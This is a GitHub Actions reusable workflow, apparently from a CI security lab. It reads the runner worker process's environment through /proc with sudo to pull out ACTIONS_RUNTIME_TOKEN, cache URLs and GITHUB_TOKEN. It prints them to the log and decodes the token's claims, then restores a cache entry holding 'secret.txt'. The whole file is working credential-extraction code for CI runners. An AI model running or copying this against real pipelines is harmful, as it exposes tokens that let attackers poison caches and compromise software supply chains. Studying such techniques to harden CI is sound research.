name: Reusable Cache Reader
on:
  workflow_call:

jobs:
  inspect-and-read:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Environment & Inspect Token
        run: |
          echo "=== SEARCHING RUNNER PROCESS FOR TOKENS ==="
          # Извлекаем ACTIONS_RUNTIME_TOKEN и URLs из окружения процесса Node/Runner
          ENV_DUMP=$(sudo strings /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | grep -E 'ACTIONS_CACHE_URL|ACTIONS_RESULTS_URL|ACTIONS_RUNTIME_TOKEN' || true)
          
          if [ -z "$ENV_DUMP" ]; then
            echo "Direct proc dump empty, checking system env..."
            ENV_DUMP=$(env | grep -E 'ACTIONS|GITHUB_TOKEN')
          fi

          echo "$ENV_DUMP"

          TOKEN=$(echo "$ENV_DUMP" | grep 'ACTIONS_RUNTIME_TOKEN=' | cut -d'=' -f2-)
          
          if [ -n "$TOKEN" ]; then
            echo "=== DECODING ACTIONS_RUNTIME_TOKEN CLAIMS ==="
            PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
            mod=$(($(echo -n "$PAYLOAD" | wc -c) % 4))
            if [ $mod -eq 2 ]; then PAYLOAD="${PAYLOAD}=="; fi
            if [ $mod -eq 3 ]; then PAYLOAD="${PAYLOAD}="; fi
            echo "$PAYLOAD" | base64 -d | jq .
          else
            echo "TOKEN NOT FOUND IN RUNNER ENV"
          fi

      - name: Test Cache Read via Official Action Client
        uses: actions/cache/restore@v4
        with:
          path: secret.txt
          key: lab-secret-cache-v1
